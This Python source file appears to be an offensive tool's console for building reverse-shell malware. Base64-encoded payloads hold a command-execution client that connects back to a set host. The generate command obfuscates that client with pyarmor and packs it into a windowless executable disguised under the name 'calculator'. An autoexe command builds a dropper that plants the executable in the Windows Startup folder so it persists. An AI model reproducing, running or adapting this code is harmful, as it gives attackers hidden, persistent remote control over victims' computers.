from modules.session import Session
from modules.color import Color
from rich.console import Console
from rich.table import Table
import subprocess
import os
import base64
import tempfile
import platform
import datetime
import signal
variablesConfig: dict = {
    "session.lhost": "localhost",
    "session.lport": 4444,
    "generate.lhost": "localhost",
    "generate.lport": 4444,
    "windows.autoexe.path": None,
}


def load_banner():
    with open("banner.txt", "r") as banner:
        print(banner.read())


def set_var(command):
    variable, value = command.split(" ")[1:]
    if variable not in variablesConfig:
        print(f"{Color.OKGREEN}Variable not found{Color.DEFAULT}")
        return
    variablesConfig[variable] = value
    print(f"{Color.OKBLUE}{variable} set to {value}{Color.DEFAULT}")


def help(_):
    for command, data in commands.items():
        table = Table(title=command, title_style="bold green", title_justify="start")
        table.add_column("Variable")
        table.add_column("Description")
        for var in data["vars"]:
            table.add_row(var, "variable configuration")
        table.add_row("Description", data["description"])
        console = Console()
        console.print(table)


def start_session(command):
    Session(variablesConfig["session.lhost"], int(variablesConfig["session.lport"])).start()


def read_payload():
        payload = base64.b64decode("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKCmNsYXNzIENsaWVudDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0LCBwb3J0KToKICAgICAgICBzZWxmLmhvc3QgPSBob3N0CiAgICAgICAgc2VsZi5wb3J0ID0gcG9ydAogICAgICAgIHNlbGYuY2xpZW50ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHNlbGYuY2xpZW50LmNvbm5lY3QoKHNlbGYuaG9zdCwgc2VsZi5wb3J0KSkKCiAgICBkZWYgc2VuZChzZWxmOiBpc2luc3RhbmNlLCBkYXRhOiBieXRlcyk6CiAgICAgICAgc2VsZi5jbGllbnQuc2VuZChkYXRhKQoKICAgIGRlZiByZWNlaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmNsaWVudC5yZWN2KDYwMDApCgoKY2xpZW50ID0gTm9uZQpkZWYgY29ubmVjdCgpOgogICAgZ2xvYmFsIGNsaWVudAogICAgd2hpbGUgY2xpZW50IGlzIE5vbmU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjbGllbnQgPSBDbGllbnQoJHtMSE9TVH0sICR7TFBPUlR9KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCgpjb25uZWN0KCkKCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgY29tbWFuZCA9IGNsaWVudC5yZWNlaXZlKCkuZGVjb2RlKCkKICAgICAgICBpZiBjb21tYW5kIGlzIE5vbmU6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgIGNvbW1hbmQsCiAgICAgICAgICAgIHNoZWxsPVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICApCiAgICAgICAgb3V0cHV0ID0gb3V0cHV0LnN0ZGVyciBpZiBvdXRwdXQuc3RkZXJyIGVsc2Ugb3V0cHV0LnN0ZG91dAoKICAgICAgICBpZiBvdXRwdXQgaXMgTm9uZSBvciBvdXRwdXQgPT0gIiI6CiAgICAgICAgICAgIG91dHB1dCA9ICJDb21tYW5kIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseSIKCiAgICAgICAgY2xpZW50LnNlbmQob3V0cHV0LmVuY29kZSgpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBjbGllbnQgPSBOb25lCiAgICAgICAgY29ubmVjdCgpCiAgICAgICAgcGFzcwo=")
        return (
            payload.decode()
            .replace("${LHOST}", f"'{variablesConfig["generate.lhost"]}'")
            .replace("${LPORT}", str(variablesConfig["generate.lport"]))
        )

def generate(_):
  try:
    payload = read_payload()
    print(f"{Color.WARNING}Generating payload{Color.DEFAULT}")
    with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
        temp.write(payload)
        temp.close()

    print(f"{Color.OKGREEN}Obfuscating payload{Color.DEFAULT}")

    flag = platform.system() == 'Windows' and subprocess.CREATE_NO_WINDOW or 0

    subprocess.run(["pyarmor", "gen", temp.name], stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL ,creationflags=flag)

    ofuscated_path = os.path.join("dist", os.path.basename(temp.name))

    print(f"{Color.OKGREEN}Building payload{Color.DEFAULT}")

    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path],  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL,creationflags=flag)

    print(f"{Color.OKGREEN}Payload generated successfully{Color.DEFAULT}")

    extension = ".exe" if platform.system() == 'Windows' else ""

    fileId = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    namefile = os.path.join(os.getcwd(), f"calculator-{fileId}{extension}")

    if(os.path.exists(ofuscated_path)):
        os.rename(f"{ofuscated_path}{extension}", namefile)

    if(os.path.exists(temp.name)):
        os.remove(temp.name)

    
  except Exception as e:
    print(f"{Color.FAIL}Error generating payload: {e}{Color.DEFAULT}")
    pass


def autoexe(_):
     path = variablesConfig["windows.autoexe.path"]
     if platform.system() != 'Windows':
            print(f"{Color.FAIL}This command only works on Windows{Color.DEFAULT}")
            return
     if path is None:
         print(f"{Color.FAIL}Path of .exe not set{Color.DEFAULT}")
         return
     nameFile = os.path.basename(path)

     payload = base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc2h1dGlsCmltcG9ydCBzeXMKdHJ5OgogICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgIT0gIldpbmRvd3MiOiBleGl0KCkKCiAgICBpZiBoYXNhdHRyKHN5cywgIl9NRUlQQVNTIikgaXMgRmFsc2U6IGV4aXQoKQogICAgCiAgICBleGVjdXRhYmxlID0gb3MucGF0aC5qb2luKHN5cy5fTUVJUEFTUywgJyR7bmFtZUV4ZWN1dGFibGV9JykKICAKICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKAogICAgICAgIG9zLmVudmlyb25bIkFQUERBVEEiXSwgIk1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXAiCiAgICApCgogICAgcHJpbnQoc3RhcnR1cF9mb2xkZXIpCgogICAgc3VicHJvY2Vzcy5Qb3BlbihbZXhlY3V0YWJsZV0sIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTk9fV0lORE9XKQoKICAgIHNodXRpbC5jb3B5KGV4ZWN1dGFibGUsIHN0YXJ0dXBfZm9sZGVyICsgIlxcIiArICcke25hbWVFeGVjdXRhYmxlfScpCgogICAgcHJpbnQoIkNsaWVudCBsYXVuY2hlZCBzdWNjZXNzZnVsbHkiKQoKCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIGV4aXQoKQo=")
     payload = payload.decode().replace("${nameExecutable}", nameFile)

     with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
        temp.write(payload)
        temp.close()

     print(f"{Color.OKGREEN}Building autoexe{Color.DEFAULT}")

     subprocess.run(["pyinstaller",f"--add-data {path};.", "--onefile","--noconsole", temp.name],  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)

     fileId = datetime.datetime.now().strftime("%Y%m%d%H%M%S")

     namefile = os.path.join(os.getcwd(), f"autoexe-{fileId}.exe")

     if(os.path.exists(temp.name)):
        os.rename(f"{path}", namefile)
        os.remove(temp.name)

     print(f"{Color.OKGREEN}Autoexe generated successfully{Color.DEFAULT}")


def signal_handler(sig, frame):
    print(f"\n{Color.OKGREEN}Come back soon :){Color.DEFAULT}")
    exit(0)



commands = {
    "help": {
        "description": "Show help message",
        "vars": [],
        "action": help,
    },
    "generate": {
        "description": "Generate a reverse shell",
        "vars": ["generate.lhost", "generate.lport"],
        "action": generate,
    },
    "execute": {
        "description": "Start a session",
        "vars": ["session.lhost", "session.lport"],
        "action": start_session,
    },
    "autoexe": {
        "description": "execute on startup",
        "vars": ["windows.autoexe.path"],
        "action": autoexe,
    },
    "set": {
        "description": "Set a variable",
        "vars": ["variable", "value"],
        "action": set_var,
    },
}


load_banner()
while True:
  try:
    signal.signal(signal.SIGINT, signal_handler)
    print(f"{Color.OKBLUE}reverse_shell{Color.FAIL}@root{Color.DEFAULT}> ", end="")
    command = input()
    if command == "exit":
        break

    search = command.split(" ")[0]
    if search in commands:
        commands[search]["action"](command)
    else:
        print(f"{Color.FAIL}Command not found{Color.DEFAULT}")
  except Exception as e:
        print(f"{Color.FAIL}Invalid syntax: {e}{Color.DEFAULT}")
        pass
